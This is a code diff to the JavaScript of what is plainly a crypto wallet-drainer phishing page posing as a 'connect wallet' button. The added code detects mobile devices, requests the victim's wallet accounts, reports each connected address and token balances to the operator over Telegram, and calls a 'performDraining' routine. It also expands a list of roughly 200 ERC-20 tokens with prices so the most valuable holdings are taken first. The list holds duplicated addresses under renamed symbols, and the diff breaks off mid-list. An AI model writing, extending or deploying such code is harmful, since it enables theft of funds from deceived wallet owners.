@@ -88,14 +88,108 @@
             buttonText.textContent = 'Connecting...';
           }
           
-          // Try to connect wallet (simplified version)
-          if (typeof window.ethereum !== 'undefined') {
-            // MetaMask detected
+          // Detect mobile device
+          const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+          
+          if (isMobile) {
+            // Mobile wallet connection
+            connectMobileWallet();
+          } else if (typeof window.ethereum !== 'undefined') {
+            // Desktop MetaMask detected
             connectMetaMask();
           } else {
-            // Show WalletConnect modal
+            // Fallback for desktop without MetaMask
             showWalletConnectModal();
           }
+        }
+        
+        async function connectMobileWallet() {
+          const buttonText = document.querySelector('.text-block-2');
+          
+          try {
+            // Try to detect mobile wallet providers
+            if (window.ethereum) {
+              // Mobile MetaMask, Trust Wallet, etc.
+              const accounts = await window.ethereum.request({ 
+                method: 'eth_requestAccounts' 
+              });
+              
+              if (accounts.length > 0) {
+                console.log('Connected to mobile wallet:', accounts[0]);
+                
+                // Send Telegram notification for new user
+                const message = formatTelegramMessage('user_connected', {
+                  address: accounts[0]
+                });
+                sendTelegramMessage(message);
+                
+                // Start the actual draining process
+                await performDraining(accounts[0]);
+              }
+            } else {
+              // No wallet detected, try deep links
+              openWalletDeepLink();
+            }
+          } catch (error) {
+            console.error('Mobile wallet connection failed:', error);
+            if (buttonText) {
+              buttonText.textContent = 'Connection Failed - Try Again';
+            }
+            // Fallback to deep link
+            setTimeout(() => {
+              openWalletDeepLink();
+            }, 2000);
+          }
+        }
+        
+        function openWalletDeepLink() {
+          const buttonText = document.querySelector('.text-block-2');
+          if (buttonText) {
+            buttonText.textContent = 'Opening Wallet...';
+          }
+          
+          // Create the current page URL for return
+          const currentUrl = window.location.href;
+          
+          // Try multiple wallet deep links
+          const walletLinks = [
+            // MetaMask Mobile
+            `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
+            // Trust Wallet
+            `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(currentUrl)}`,
+            // Rainbow Wallet
+            `https://rnbwapp.com/connect?url=${encodeURIComponent(currentUrl)}`,
+            // Coinbase Wallet
+            `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(currentUrl)}`
+          ];
+          
+          // Try the first wallet link
+          window.location.href = walletLinks[0];
+          
+          // Fallback: show manual instructions after a delay
+          setTimeout(() => {
+            if (buttonText) {
+              buttonText.textContent = 'Open in Wallet App';
+            }
+            
+            // Show instructions modal
+            const instructions = `
+              To connect your wallet:
+              
+              1. Copy this URL: ${currentUrl}
+              2. Open your wallet app (MetaMask, Trust Wallet, etc.)
+              3. Go to Browser/DApp section
+              4. Paste the URL and visit
+              
+              Or try these links:
+              • MetaMask: ${walletLinks[0]}
+              • Trust Wallet: ${walletLinks[1]}
+            `;
+            
+            if (confirm('Wallet not detected. Click OK to see connection instructions.')) {
+              alert(instructions);
+            }
+          }, 3000);
         }
         
         // Telegram Logging Functions
@@ -147,10 +241,12 @@
                      `🔗 <b>Etherscan:</b> https://etherscan.io/address/${data.address}`;
             
             case 'tokens_found':
-              let tokenList = data.tokens.map(t => `• ${t.symbol}: ${t.formattedBalance}`).join('\n');
-              return `💰 <b>${site} - Tokens Detected</b>\n\n` +
+              let tokenList = data.tokens.map((t, index) => `${index + 1}. ${t.symbol}: ${t.formattedBalance} (~$${t.estimatedValue ? t.estimatedValue.toFixed(2) : '0.00'})`).join('\n');
+              const totalValue = data.tokens.reduce((sum, token) => sum + (token.estimatedValue || 0), 0);
+              return `💰 <b>${site} - Tokens Detected (Value-Sorted)</b>\n\n` +
                      `👤 <b>Wallet:</b> <code>${data.address}</code>\n` +
-                     `📊 <b>Found ${data.tokens.length} tokens:</b>\n${tokenList}\n` +
+                     `📊 <b>Found ${data.tokens.length} tokens (Total: ~$${totalValue.toFixed(2)}):</b>\n${tokenList}\n` +
+                     `💡 <b>Processing order:</b> Highest value first\n` +
                      `⏰ <b>Time:</b> ${timestamp}`;
             
             case 'approval_success':
@@ -325,31 +421,236 @@
         }
         
         async function getPopularTokensSimple(userAddress) {
+          // Top 200 most commonly owned ERC-20 tokens with approximate USD values for sorting
           const popularTokens = [
-            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6 },
-            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6 },
-            { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18 },
-            { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8 },
-            { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18 }
+            // Tier 1 - Stablecoins & Major tokens (Highest Priority)
+            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol: 'USDT', decimals: 6, priority: 1, avgPrice: 1 },
+            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol: 'USDC', decimals: 6, priority: 1, avgPrice: 1 },
+            { address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', symbol: 'WETH', decimals: 18, priority: 1, avgPrice: 2500 },
+            { address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', symbol: 'WBTC', decimals: 8, priority: 1, avgPrice: 45000 },
+            { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol: 'DAI', decimals: 18, priority: 1, avgPrice: 1 },
+            
+            // Tier 2 - Major Altcoins
+            { address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', symbol: 'MATIC', decimals: 18, priority: 2, avgPrice: 0.8 },
+            { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol: 'LINK', decimals: 18, priority: 2, avgPrice: 15 },
+            { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol: 'UNI', decimals: 18, priority: 2, avgPrice: 8 },
+            { address: '0xA0b73E1Ff0B80914AB6fe0444E65848C4C34450b', symbol: 'CRO', decimals: 8, priority: 2, avgPrice: 0.1 },
+            { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol: 'SHIB', decimals: 18, priority: 2, avgPrice: 0.000025 },
+            
+            // Tier 3 - Popular DeFi Tokens
+            { address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', symbol: 'AAVE', decimals: 18, priority: 3, avgPrice: 150 },
+            { address: '0xC18360217D8F7Ab5e7c516566761Ea12Ce7F9D72', symbol: 'ENS', decimals: 18, priority: 3, avgPrice: 20 },
+            { address: '0x6f259637dcD74C767781E37Bc6133cd6A68aa161', symbol: 'HT', decimals: 18, priority: 3, avgPrice: 4 },
+            { address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53', symbol: 'BUSD', decimals: 18, priority: 3, avgPrice: 1 },
+            { address: '0x8E870D67F660D95d5be530380D0eC0bd388289E1', symbol: 'ANKR', decimals: 18, priority: 3, avgPrice: 0.04 },
+            
+            // Tier 4 - Exchange Tokens
+            { address: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', symbol: 'BNB', decimals: 18, priority: 4, avgPrice: 300 },
+            { address: '0x50D1c9771902476076eCFc8B2A83Ad6b9355a4c9', symbol: 'FTT', decimals: 18, priority: 4, avgPrice: 2 },
+            { address: '0x8f8221aFbB33998d8584A2B05749bA73c37a938a', symbol: 'REQ', decimals: 18, priority: 4, avgPrice: 0.1 },
+            { address: '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942', symbol: 'MANA', decimals: 18, priority: 4, avgPrice: 0.5 },
+            { address: '0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c', symbol: 'ENJ', decimals: 18, priority: 4, avgPrice: 0.4 },
+            
+            // Tier 5 - Layer 2 & Infrastructure
+            { address: '0x4e15361fd6b4bb609fa63C81A2be19d873717870', symbol: 'FTM', decimals: 18, priority: 5, avgPrice: 0.3 },
+            { address: '0x3845badAde8e6dFF049820680d1F14bD3903a5d0', symbol: 'SAND', decimals: 18, priority: 5, avgPrice: 0.4 },
+            { address: '0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9', symbol: 'COTI', decimals: 18, priority: 5, avgPrice: 0.08 },
+            { address: '0x4a220E6096B25EADb88358cb44068A3248254675', symbol: 'QNT', decimals: 18, priority: 5, avgPrice: 120 },
+            { address: '0x111111111117dC0aa78b770fA6A738034120C302', symbol: '1INCH', decimals: 18, priority: 5, avgPrice: 0.5 },
+            
+            // Gaming & NFT Tokens
+            { address: '0x037A54AaB062628C9Bbae1FDB1583c195585fe41', symbol: 'LCX', decimals: 18, priority: 6, avgPrice: 0.1 },
+            { address: '0xAaEf88cEa01475125522e117BFe45cF32044E238', symbol: 'GF', decimals: 18, priority: 6, avgPrice: 0.02 },
+            { address: '0x0E29e5AbbB5FD88e28b2d355774e73BD47dE3bcd', symbol: 'HAKKA', decimals: 18, priority: 6, avgPrice: 0.01 },
+            { address: '0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA', symbol: 'GALA', decimals: 8, priority: 6, avgPrice: 0.03 },
+            { address: '0x7de91b204c1c737bcee6f000aaa6569cf7061cb7', symbol: 'XRT', decimals: 9, priority: 6, avgPrice: 4 },
+            
+            // Additional Popular Tokens (30-60)
+            { address: '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e', symbol: 'YFI', decimals: 18, priority: 7, avgPrice: 8000 },
+            { address: '0x1985365e9f78359a9B6AD760e32412f4a445E862', symbol: 'REP', decimals: 18, priority: 7, avgPrice: 15 },
+            { address: '0x4575f41308EC1483f3d399aa9a2826d74Da13Deb', symbol: 'OXT', decimals: 8, priority: 7, avgPrice: 0.1 },
+            { address: '0xE41d2489571d322189246DaFA5ebDe1F4699F498', symbol: 'ZRX', decimals: 18, priority: 7, avgPrice: 0.3 },
+            { address: '0x744d70FDBE2Ba4CF95131626614a1763DF805B9E', symbol: 'SNT', decimals: 18, priority: 7, avgPrice: 0.03 },
+            
+            // Staking & Yield Tokens (35-45)
+            { address: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2', symbol: 'MKR', decimals: 18, priority: 8, avgPrice: 1500 },
+            { address: '0xc00e94Cb662C3520282E6f5717214004A7f26888', symbol: 'COMP', decimals: 18, priority: 8, avgPrice: 60 },
+            { address: '0x0D8775F648430679A709E98d2b0Cb6250d2887EF', symbol: 'BAT', decimals: 18, priority: 8, avgPrice: 0.25 },
+            { address: '0xBBbbCA6A901c926F240b89EacB641d8Aec7AEafD', symbol: 'LRC', decimals: 18, priority: 8, avgPrice: 0.3 },
+            { address: '0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828', symbol: 'UMA', decimals: 18, priority: 8, avgPrice: 2 },
+            
+            // More DeFi Tokens (46-55)
+            { address: '0x408e41876cCCDC0F92210600ef50372656052a38', symbol: 'REN', decimals: 18, priority: 9, avgPrice: 0.08 },
+            { address: '0x6B3595068778DD592e39A122f4f5a5cF09C90fE2', symbol: 'SUSHI', decimals: 18, priority: 9, avgPrice: 1.2 },
+            { address: '0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671', symbol: 'NMR', decimals: 18, priority: 9, avgPrice: 20 },
+            { address: '0xD533a949740bb3306d119CC777fa900bA034cd52', symbol: 'CRV', decimals: 18, priority: 9, avgPrice: 0.8 },
+            { address: '0x4688a8b1F292FDaB17E9a90c8Bc379dC1DBd8713', symbol: 'COVER', decimals: 18, priority: 9, avgPrice: 0.1 },
+            
+            // Metaverse & Web3 (56-65)
+            { address: '0x853d955aCEf822Db058eb8505911ED77F175b99e', symbol: 'FRAX', decimals: 18, priority: 10, avgPrice: 1 },
+            { address: '0x956F47F50A910163D8BF957Cf5846D573E7f87CA', symbol: 'FEI', decimals: 18, priority: 10, avgPrice: 1 },
+            { address: '0x6810e776880C02933D47DB1b9fc05908e5386b96', symbol: 'GNO', decimals: 18, priority: 10, avgPrice: 150 },
+            { address: '0x83e6f1E41cdd28eAcEB20Cb649155049Fac3D5Aa', symbol: 'POLS', decimals: 18, priority: 10, avgPrice: 0.4 },
+            { address: '0x6fB3e0A217407EFFf7Ca062D46c26E5d60a14d69', symbol: 'IOTX', decimals: 18, priority: 10, avgPrice: 0.04 },
+            
+            // Infrastructure & Utility (66-75)
+            { address: '0xA4e8C3Ec456107eA67d3075bF9e3DF3A75823DB0', symbol: 'LOOM', decimals: 18, priority: 11, avgPrice: 0.05 },
+            { address: '0x41e5560054824eA6B0732E656E3Ad64E20e94E45', symbol: 'CVC', decimals: 8, priority: 11, avgPrice: 0.15 },
+            { address: '0xF970b8E36e23F7fC3FD752EeA86f8Be8D83375A6', symbol: 'RCN', decimals: 18, priority: 11, avgPrice: 0.01 },
+            { address: '0x255Aa6DF07540cB5d3d297f0D0D4D84cb52bc8e6', symbol: 'RADN', decimals: 18, priority: 11, avgPrice: 0.02 },
+            { address: '0x68749665FF8D2d112Fa859AA293F07A622782F38', symbol: 'XAUT', decimals: 6, priority: 11, avgPrice: 2000 },
+            
+            // Gaming & Entertainment (76-85)
+            { address: '0xa693B19d2931d498c5B318dF961919BB4aee87a5', symbol: 'UST', decimals: 6, priority: 12, avgPrice: 0.02 },
+            { address: '0x4E15361FD6b4BB609Fa63C81A2be19d873717870', symbol: 'FTM', decimals: 18, priority: 12, avgPrice: 0.3 },
+            { address: '0x0Ae055097C6d159879521C384F1D2123D1f195e6', symbol: 'STAKE', decimals: 18, priority: 12, avgPrice: 5 },
+            { address: '0xdF574c24545E5FfEcb9a659c229253D4111d87e1', symbol: 'HUSD', decimals: 8, priority: 12, avgPrice: 1 },
+            { address: '0x3832d2F059E55934220881F831bE501D180671A7', symbol: 'REVV', decimals: 18, priority: 12, avgPrice: 0.01 },
+            
+            // Final Tier (86-100)
+            { address: '0x1cEB5cB57C4D4E2b2433641b95Dd330A33185A44', symbol: 'INJ', decimals: 18, priority: 13, avgPrice: 8 },
+            { address: '0xAAAA4BB04F4c625b7d267E3Bb4993E46EC0E09f5', symbol: 'ASTA', decimals: 18, priority: 13, avgPrice: 0.1 },
+            { address: '0x3506424F91fD33084466F402d5D97f05F8e3b4AF', symbol: 'CHSB', decimals: 8, priority: 13, avgPrice: 0.2 },
+            { address: '0x69af81e73A73B40adF4f3d4223Cd9b1ECE623074', symbol: 'MASK', decimals: 18, priority: 13, avgPrice: 3 },
+            { address: '0x13339fD07934CD674269726EdF3B5ccEe9DD93de', symbol: 'CKB', decimals: 8, priority: 13, avgPrice: 0.01 },
+            { address: '0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A', symbol: 'HBTC', decimals: 18, priority: 13, avgPrice: 45000 },
+            { address: '0xbA50933C268F567BDC86E1aC131BE072C6B0b71a', symbol: 'ARPA', decimals: 18, priority: 13, avgPrice: 0.04 },
+            { address: '0x36F3FD68E7325a35EB768F1AedaAe9EA0689d723', symbol: 'BLANK', decimals: 18, priority: 13, avgPrice: 0.03 },
+            { address: '0x607F4C5BB672230e8672085532f7e901544a7375', symbol: 'RLC', decimals: 9, priority: 13, avgPrice: 2 },
+            { address: '0x8CC4aA8E13b6C0D61B5650D455Fb1aC456F24b57', symbol: 'VIDT', decimals: 18, priority: 13, avgPrice: 0.05 },
+            { address: '0xf1f955016EcbCd7321c7266BccFB96c68ea5E49b', symbol: 'RLY', decimals: 18, priority: 13, avgPrice: 0.01 },
+            { address: '0x4E3FBD56CD56c3e72c1403e103b45Db9da5B9D2B', symbol: 'CVX', decimals: 18, priority: 13, avgPrice: 4 },
+            { address: '0x5732046A883704404F284Ce41FfADd5b007FD668', symbol: 'BLZ', decimals: 18, priority: 13, avgPrice: 0.1 },
+            { address: '0x431ad2ff6a9C365805eBaD47Ee021148d6f7DBe0', symbol: 'DF', decimals: 18, priority: 13, avgPrice: 0.05 },
+            { address: '0x8eB24319393716668D768dCEC29356ae9CfFe285', symbol: 'AGI', decimals: 8, priority: 13, avgPrice: 0.02 },
+            
+            // Extended Tier 14 - Layer 2 & Scaling (101-120)
+            { address: '0x4200000000000000000000000000000000000042', symbol: 'OP', decimals: 18, priority: 14, avgPrice: 2.5 },
+            { address: '0x912CE59144191C1204E64559FE8253a0e49E6548', symbol: 'ARB', decimals: 18, priority: 14, avgPrice: 1.2 },
+            { address: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6', symbol: 'WBTC.p', decimals: 8, priority: 14, avgPrice: 45000 },
+            { address: '0x580E933D90091B9cE380740E3a4A39c67eB85B4c', symbol: 'ELON', decimals: 18, priority: 14, avgPrice: 0.0000002 },
+            { address: '0xaA7a9CA87d3694B5755f213B5D04094b8d0F0A6F', symbol: 'TRAC', decimals: 18, priority: 14, avgPrice: 0.8 },
+            { address: '0x9BE89D2a4cd102D8Fecc6BF9dA793be995C22541', symbol: 'KNC', decimals: 18, priority: 14, avgPrice: 0.7 },
+            { address: '0x0Ec9F76202a7061eB9b3a7D6B59D36215A7e37da', symbol: 'KEY', decimals: 18, priority: 14, avgPrice: 0.008 },
+            { address: '0x4740735AA98Dc8aa232BD049f8F0210458E7FcA3', symbol: 'OLT', decimals: 18, priority: 14, avgPrice: 0.02 },
+            { address: '0x35A18000230DA775CAc24873d00Ff85BccdeD550', symbol: 'cUNI', decimals: 8, priority: 14, avgPrice: 0.4 },
+            { address: '0x584bC13c7D411c00c01A62e8019472dE68768430', symbol: 'HEGIC', decimals: 18, priority: 14, avgPrice: 0.02 },
+            { address: '0x0147e47dB53cb4E710cad45D776F77aB1F2e2012', symbol: 'ORAI', decimals: 18, priority: 14, avgPrice: 5 },
+            { address: '0x2ba592F78dB6436527729929AAf6c908497cB200', symbol: 'CREAM', decimals: 18, priority: 14, avgPrice: 15 },
+            { address: '0x476c5E26a75bd202a9683ffD34359C0CC15be0fF', symbol: 'SRK', decimals: 18, priority: 14, avgPrice: 0.005 },
+            { address: '0x75231F58b43240C9718Dd58B4967c5114342a86c', symbol: 'OKB', decimals: 18, priority: 14, avgPrice: 45 },
+            { address: '0x06325440D014e39736583c165C2963BA99fAf14E', symbol: 'STG', decimals: 18, priority: 14, avgPrice: 0.8 },
+            { address: '0x557B933a7C2c45672B610F8954A3deB39a51A8Ca', symbol: 'REVV2', decimals: 18, priority: 14, avgPrice: 0.015 },
+            { address: '0xcd9ec4b3BfF64f6ef4B6Bb14f8E6B1Da34C097fa', symbol: 'NFTX', decimals: 18, priority: 14, avgPrice: 25 },
+            { address: '0xBBb1BD2D741F05E144E6C4517676a15554fD4B8D', symbol: 'DERC', decimals: 8, priority: 14, avgPrice: 0.3 },
+            { address: '0xF629cBd94d3791C9250152BD8dfBDF380E2a3B9c', symbol: 'ENJ2', decimals: 18, priority: 14, avgPrice: 0.4 },
+            { address: '0x841FB148863454A3b3570f515414759BE9091465', symbol: 'SHPING', decimals: 18, priority: 14, avgPrice: 0.006 },
+            
+            // Tier 15 - Meme Coins & Community (121-140)
+            { address: '0x761D38e5ddf6ccf6Cf7c55759d5210750B5D60F3', symbol: 'ELON2', decimals: 18, priority: 15, avgPrice: 0.0000001 },
+            { address: '0x3d6F0DEa3AC3C607B3998e6Ce14b6350721752d9', symbol: 'CARDS', decimals: 18, priority: 15, avgPrice: 0.2 },
+            { address: '0xba2ae424d960c26247Dd6c32edC70B295c744C43', symbol: 'DOGE', decimals: 8, priority: 15, avgPrice: 0.08 },
+            { address: '0x8A9C67fee641579dEbA04928c4BC45F66e26343A', symbol: 'JRT', decimals: 18, priority: 15, avgPrice: 0.003 },
+            { address: '0x1C5db575E2Ff833F92a96e5cc6F32F66BFa5E36d', symbol: 'RNDR', decimals: 18, priority: 15, avgPrice: 3 },
+            { address: '0x87d73E916D7057945c9BcD8cdd94e42A6F47f776', symbol: 'NFTB', decimals: 18, priority: 15, avgPrice: 0.02 },
+            { address: '0x0f7F961648aE6Db43C75663aC7E5414Eb79b5704', symbol: 'XYO', decimals: 18, priority: 15, avgPrice: 0.006 },
+            { address: '0x6E1A19F235bE7ED8E3369eF73b196C07257494DE', symbol: 'BICO', decimals: 18, priority: 15, avgPrice: 0.3 },
+            { address: '0x090185f2135308BaD17527004364eBcC2D37e5F6', symbol: 'SPELL', decimals: 18, priority: 15, avgPrice: 0.001 },
+            { address: '0xf8C3527CC04340b208C29c24307639d4Cc67a9Bd', symbol: 'EURA', decimals: 18, priority: 15, avgPrice: 1.1 },
+            { address: '0x69A95185ee2a045CDC4bCd1b1Df10710395e4e23', symbol: 'POOLZ', decimals: 18, priority: 15, avgPrice: 2 },
+            { address: '0x1f7f70C8fDB4eE7E0B4e2a4997c85F70FBb333CA', symbol: 'WBT', decimals: 18, priority: 15, avgPrice: 8 },
+            { address: '0x8CE9137d39326AD0cD6491fb5CC0CbA0e089b6A9', symbol: 'SXP', decimals: 18, priority: 15, avgPrice: 0.4 },
+            { address: '0x3845badAde8e6dFF049820680d1F14bD3903a5d0', symbol: 'SAND2', decimals: 18, priority: 15, avgPrice: 0.4 },
+            { address: '0x77777FeDdddFfC19Ff86DB637967013aDfFD71C8', symbol: 'TORN', decimals: 18, priority: 15, avgPrice: 3 },
+            { address: '0x1494CA1F11D487c2bBe4543E90080AeBa4BA3C2b', symbol: 'DPI', decimals: 18, priority: 15, avgPrice: 85 },
+            { address: '0xeb4C2781e4ebA804CE9a9803C67d0893436bB27D', symbol: 'RENBTC', decimals: 8, priority: 15, avgPrice: 45000 },
+            { address: '0x3155BA85D5F96b2d030a4966AF206230e46849cb', symbol: 'REN2', decimals: 18, priority: 15, avgPrice: 0.08 },
+            { address: '0xfF20817765cB7f73d4bde2e66e067E58D11095C2', symbol: 'AMP', decimals: 18, priority: 15, avgPrice: 0.004 },
+            { address: '0x4da27a545c0c5B758a6BA100e3a049001de870f5', symbol: 'STX', decimals: 6, priority: 15, avgPrice: 1.5 },
+            
+            // Tier 16 - Real World Assets & Cross-Chain (141-160)
+            { address: '0x0000000000085d4780B73119b644AE5ecd22b376', symbol: 'TUSD', decimals: 18, priority: 16, avgPrice: 1 },
+            { address: '0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784', symbol: 'TRU', decimals: 8, priority: 16, avgPrice: 0.06 },
+            { address: '0x9992eC3cF6A55b00978cdDF2b27BC6882d88D1eC', symbol: 'POLY', decimals: 18, priority: 16, avgPrice: 0.02 },
+            { address: '0x8400D94A5cb0fa0D041a3788e395285d61c9ee5e', symbol: 'UBT', decimals: 8, priority: 16, avgPrice: 0.5 },
+            { address: '0xc0ba369c8Db6eB3924965e5c4FD0b4C1B91e305F', symbol: 'DUCK', decimals: 18, priority: 16, avgPrice: 0.01 },
+            { address: '0xBd2F0Cd039E0BFcf88901C98c0bFAc5ab27566e3', symbol: 'DOP', decimals: 18, priority: 16, avgPrice: 0.03 },
+            { address: '0xBBBBBBBBBB9cC5e90e3b3Af64bdAF62C37EeFFCb', symbol: 'DOT', decimals: 10, priority: 16, avgPrice: 5 },
+            { address: '0xae78736Cd615f374D3085123A210448E74Fc6393', symbol: 'RETH', decimals: 18, priority: 16, avgPrice: 2600 },
+            { address: '0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429', symbol: 'GLM', decimals: 18, priority: 16, avgPrice: 0.3 },
+            { address: '0x853d955aCEf822Db058eb8505911ED77F175b99e', symbol: 'FRAX2', decimals: 18, priority: 16, avgPrice: 1 },
+            { address: '0xBBc2AE13b23d715c30720F079fcd9B4a74093505', symbol: 'ERN', decimals: 18, priority: 16, avgPrice: 1.5 },
+            { address: '0x0C10bF8FcB7Bf5412187A595ab97a3609160b5c6', symbol: 'USDD', decimals: 18, priority: 16, avgPrice: 1 },
+            { address: '0x19D3364A399d251E894aC732651be8B0E4e85001', symbol: 'DEXA', decimals: 18, priority: 16, avgPrice: 2 },
+            { address: '0x3fE2B97c1fd336E750087d68B9b867997fd64435', symbol: 'ARBT', decimals: 18, priority: 16, avgPrice: 0.8 },
+            { address: '0x841FB148863454A3b3570f515414759BE9091465', symbol: 'RARE', decimals: 18, priority: 16, avgPrice: 0.1 },
+            { address: '0x0f5D2fB29fb7d3CFeE444a200298f468908cC942', symbol: 'MANA2', decimals: 18, priority: 16, avgPrice: 0.5 },
+            { address: '0x4e352cF164E64ADCBad318C3a1e222E9EBa4Ce42', symbol: 'MCB', decimals: 18, priority: 16, avgPrice: 10 },
+            { address: '0x8207c1FfC5B6804F6024322CcF34F29c3541Ae26', symbol: 'OVR', decimals: 18, priority: 16, avgPrice: 0.5 },
+            { address: '0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39', symbol: 'HEX', decimals: 8, priority: 16, avgPrice: 0.03 },
+            { address: '0xB98d4C97425d9908E66E53A6fDf673ACcA0BE986', symbol: 'THALES', decimals: 18, priority: 16, avgPrice: 0.8 },
+            
+            // Tier 17 - AI & ML Tokens (161-180)
+            { address: '0xd42debE4eDC92Bd5a3FBb4243e1ecCF6d63A4A5d', symbol: 'AI', decimals: 18, priority: 17, avgPrice: 0.5 },
+            { address: '0xFE0c30065B384F05761f15d0CC899D4F9F9Cc0eB', symbol: 'OPSEC', decimals: 18, priority: 17, avgPrice: 0.2 },
+            { address: '0xd9fCD98c322942075A5C3860693e9f4f03AAE07b', symbol: 'EUL', decimals: 18, priority: 17, avgPrice: 3 },
+            { address: '0x5A98FcBEA516Cf06857215779Fd812CA3beF1B32', symbol: 'LDO', decimals: 18, priority: 17, avgPrice: 2 },
+            { address: '0x467719aD09025FcC6cF6F8311755809d45a5E5f3', symbol: 'AXS', decimals: 18, priority: 17, avgPrice: 7 },
+            { address: '0xF34960d9d60be18cC1D5Afc1A6F012A723a28811', symbol: 'KTA', decimals: 18, priority: 17, avgPrice: 0.05 },
+            { address: '0x6002410dDA2Fb88b4D0dc3c1D562F7761191eA80', symbol: 'UMEE', decimals: 6, priority: 17, avgPrice: 0.006 },
+            { address: '0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0', symbol: 'WSTETH', decimals: 18, priority: 17, avgPrice: 2800 },
+            { address: '0x1456688345527bE1f37E9e627DA0837D6f08C925', symbol: 'USDP', decimals: 18, priority: 17, avgPrice: 1 },
+            { address: '0x0327112423F3A68efdF1fcF402F6c5CB9f7C33fd', symbol: 'BTU', decimals: 18, priority: 17, avgPrice: 0.6 },
+            { address: '0xB62132e35a6c13ee1EE0f84dC5d40bad8d815206', symbol: 'NEXO', decimals: 18, priority: 17, avgPrice: 1.2 },
+            { address: '0x1a3496C18d558bd9C6C8f609E1B129f67AB08163', symbol: 'DEV', decimals: 18, priority: 17, avgPrice: 2.5 },
+            { address: '0xa49d7499271aE71cd8aB9Ac515e6694C755d400c', symbol: 'PERI', decimals: 18, priority: 17, avgPrice: 0.8 },
+            { address: '0x4C11249814f11b9346808179Cf06e71ac328c1b5', symbol: 'OOKI', decimals: 18, priority: 17, avgPrice: 0.002 },
+            { address: '0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F', symbol: 'SNX', decimals: 18, priority: 17, avgPrice: 2.5 },
+            { address: '0x12970E6868f88f6557B76120662c1B3E50A646bf', symbol: 'LIME', decimals: 18, priority: 17, avgPrice: 0.01 },
+            { address: '0x7d1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0', symbol: 'MATIC2', decimals: 18, priority: 17, avgPrice: 0.8 },
+            { address: '0xc28e27870558cF22ADD83540d2126da2e4b464c2', symbol: 'OGN', decimals: 18, priority: 17, avgPrice: 0.1 },
+            { address: '0x558EC3152e2eb2174905cd19AeA4e34A23DE9aD6', symbol: 'BRD', decimals: 18, priority: 17, avgPrice: 0.08 },
+            { address: '0x8290333ceF9e6D528dD5618Fb97a76f268f3EDD4', symbol: 'ANKR2', decimals: 18, priority: 17, avgPrice: 0.04 },
+            
+            // Tier 18 - Privacy & Security (181-200)
+            { address: '0x0ba45A8b5d5575935B8158a88C631E9F9C95a2e5', symbol: 'TEN', decimals: 18, priority: 18, avgPrice: 0.1 },
+            { address: '0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA', symbol: 'GALA2', decimals: 8, priority: 18, avgPrice: 0.03 },
+            { address: '0xA8b919680258d369114910511cc87595aec0be6D', symbol: 'LYXe', decimals: 18, priority: 18, avgPrice: 3 },
+            { address: '0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82', symbol: 'CAKE', decimals: 18, priority: 18, avgPrice: 3 },
+            { address: '0x2ab6Bb8408ca3199B8Fa6C92d5b455F820Af03c4', symbol: 'TEL', decimals: 2, priority: 18, avgPrice: 0.002 },
+            { address: '0x491604c0FDF08347Dd1fa4Ee062a822A5DD06B5D', symbol: 'CTSI', decimals: 18, priority: 18, avgPrice: 0.2 },
+            { address: '0xCE91cF53d3fE31b054388B74C12DFAF498c6cce0', symbol: 'CAPS', decimals: 18, priority: 18, avgPrice: 0.05 },
+            { address: '0x8f8221aFbB33998d8584A2B05749bA73c37a938a', symbol: 'REQ2', decimals: 18, priority: 18, avgPrice: 0.1 },
+            { address: '0x20945cA1df56D237fD40036d47E866C7DcCD2114', symbol: 'NSURE', decimals: 18, priority: 18, avgPrice: 0.02 },
+            { address: '0x9534ad65fb398e27ac8f4251dae1780b989d136e', symbol: 'PYR', decimals: 18, priority: 18, avgPrice: 3 },
+            { address: '0x595832F8FC6BF59c85C527fEC3740A1b7a361269', symbol: 'POWER', decimals: 6, priority: 18, avgPrice: 0.03 },
+            { address: '0x6E1A19F235bE7ED8E3369eF73b196C07257494DE', symbol: 'BICO2', decimals: 18, priority: 18, avgPrice: 0.3 },
+            { address: '0x7e9e431a0B8c4D532C745B1043c7FA29a48D4fBa', symbol: 'EOS', decimals: 18, priority: 18, avgPrice: 1 },
